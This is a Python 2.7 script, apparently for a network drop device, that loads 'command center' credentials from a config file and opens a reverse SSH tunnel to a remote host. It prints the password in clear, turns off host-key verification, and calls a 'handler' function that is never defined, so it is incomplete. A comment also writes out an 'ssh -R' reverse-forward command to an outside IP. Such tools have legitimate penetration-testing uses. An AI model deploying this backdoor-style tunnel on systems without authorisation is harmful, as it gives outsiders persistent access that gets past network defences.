#! /usr/local/bin/python2.7

from time import sleep
# from Adafruit_I2C import Adafruit_I2C
# from Adafruit_MCP230xx import Adafruit_MCP230XX
# from Adafruit_CharLCDPlate import Adafruit_CharLCDPlate
from subprocess import call
from sys import exit
from ConfigParser import SafeConfigParser

# import smbus
import subprocess
import re
import socket
import fcntl
import struct
import paramiko
import socket
import signal
import threading

# INI file config file
# Load in user name and IP address of command center 
# for the reverse shell test
parser = SafeConfigParser()
parser.read('./setting.conf')

def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):
    transport.request_port_forward('', server_port)
    while True:
        chan = transport.accept(1000)
        if chan is None:
            continue
        thr = threading.Thread(target=handler, args=(chan, remote_host, remote_port))
        thr.setDaemon(True)
        thr.start()

# -------------------
# |  Reverse Shell  |
# -------------------
def do_reverse_ssh():

	print("Starting reverse tunneling..." + "\n")

	port = parser.get('reverse_shell', 'port')
	userNameSSH = parser.get('reverse_shell', 'userName')
	passWordSSH = parser.get('reverse_shell', 'passWord')
	ccIP = parser.get('reverse_shell', 'reverseDest')

	print("Username:\n" + userNameSSH + "\n")
	sleep(1)
	print("Password:\n" + passWordSSH + "\n")
	sleep(1)
	print("Destination IP:\n" + ccIP + "\n")
	sleep(1)
	print("Port:\n" + port + "\n")

	remote_host = ccIP
	remote_port = port
	local_port  = port
	ssh_host    = "localhost"
	ssh_port    = 22

	user     = userNameSSH
	password = passWordSSH

	# transport = paramiko.Transport((ssh_host, ssh_port))

	# # Command for paramiko-1.7.7.1
	# transport.connect(hostkey  = None,
	#                   username = user,
	#                   password = password,
	#                   pkey     = None)

	client = paramiko.SSHClient()
	client.load_system_host_keys()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	print('Connecting to ssh host %s:%d ...' % (remote_host, ssh_port))
	try:
		client.connect(remote_host, username=user, password=password)
	except Exception, e:
		# print '*** Failed to connect to %s:%d: %r' % (ssh_host, server[1], e)
		print '*** Failed to connect'
		exit(1)

	print '*** Success! Connected'
	# verbose('Now forwarding remote port %d to %s:%d ...' % (options.port, remote[0], remote[1]))

	try:
		reverse_forward_tunnel(local_port,remote_host, remote_port, client.get_transport())
	except KeyboardInterrupt:
		print 'C-c: Port forwarding stopped.'
		exit(0)



	# try:
	#     forward_tunnel(local_port, remote_host, remote_port, transport)
	# except KeyboardInterrupt:
	#     print 'Port forwarding stopped.'
	#     sys.exit(0)

	# try:
	# 	ssh = paramiko.SSHClient()
	# 	# ssh.load_system_host_keys()
	# 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())		# automatically adds to known hosts
	# 	ssh.connect(ccIP, username=userNameSSH, password=passWordSSH)

	# ssh = paramiko.SSHClient()
	# transport = paramiko.Transport(ccIP)

	# print( transport.is_active )

	# # ssh -R 19999:localhost:22 sourceuser@138.47.99.99
	# transport.request_port_forward(ccIP, 22)


	# while True:
	# 	chan = transport.accept(1000)
	# 	if chan is None:
	# 		continue
	# 	thr = threading.Thread(target=handler, args=(chan, ccIP, 22))
	# 	thr.setDaemon(True)
	# 	thr.start()

do_reverse_ssh();